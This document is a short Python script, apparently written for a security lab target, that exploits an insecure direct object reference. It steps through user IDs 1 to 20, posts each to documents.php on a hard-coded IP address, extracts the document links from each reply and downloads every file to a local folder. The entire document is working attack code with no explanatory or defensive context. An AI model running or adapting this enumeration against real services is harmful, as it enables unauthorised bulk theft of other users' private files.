import requests
import re
import os

base = "http://83.136.249.246:54082"
save_dir = "downloads"

if not os.path.exists(save_dir):
    os.makedirs(save_dir)

for uid in range(1, 21):
    print(f"[*] Checking uid={uid}")
    resp = requests.post(f"{base}/documents.php", data={"uid": str(uid)})
    urls = re.findall(r"/documents/[^']+", resp.text)
    for url in urls:
        file_url = base + url
        filename = url.split('/')[-1]
        print(f"  [+] Downloading {filename}")
        r = requests.get(file_url)
        if r.status_code == 200:
            with open(os.path.join(save_dir, filename), "wb") as f:
                f.write(r.content)
        else:
            print(f"  [-] Failed to download {filename}")

print("Done.")
